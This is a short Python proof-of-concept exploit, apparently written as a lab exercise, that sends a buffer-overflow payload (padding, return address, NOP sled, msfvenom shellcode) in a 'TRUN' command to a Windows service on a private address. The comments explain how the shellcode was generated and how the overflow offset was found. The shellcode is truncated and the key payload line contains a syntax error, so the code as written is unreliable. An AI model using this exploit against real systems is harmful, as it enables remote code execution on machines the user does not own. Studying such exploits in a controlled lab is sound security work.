#!/usr/bin/env python               # this is daniels home cooked POC on buffer overflows vs a windows system

import socket  # importing the socket function from the python library

TCP_IP = ('10.0.0.107')   # declairing variable for IP address of vulnerable server
TCP_PORT = 5555

#shell" " 


shell = (" \xd9\xea\...")  # this is an msfvenom payload that you would create like we did with the windows example. instead of having it come out in an .exe file
# have it come out as C programming.   so the flag is '-f' c  instead of '-f' exe 



#attack = ("A" = 3000) # sends out 3000 A's and causes a buffer overflow
#attack = " "  # this is a string of characters designed to find out when and where the buffer overflow occurred
#attack = ("A" * 2003) + "\x4d\xee" + ....
attack = ("A" * 2003) = "\xbb\x11\x50\x62" + ("\x90" * 16) + shell + ("C" * 630) #windows xp 32 bit
#attack = ...








s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((TCP_IP, TCP_PORT))
print s.recv(1024)
print "sending attack to target"
print attack
s.send(('TRUN /.:/' + attack + '\r\n'))
print s.recv(1024)
s.send('EXIT\r\n')
print s.recv(1024)
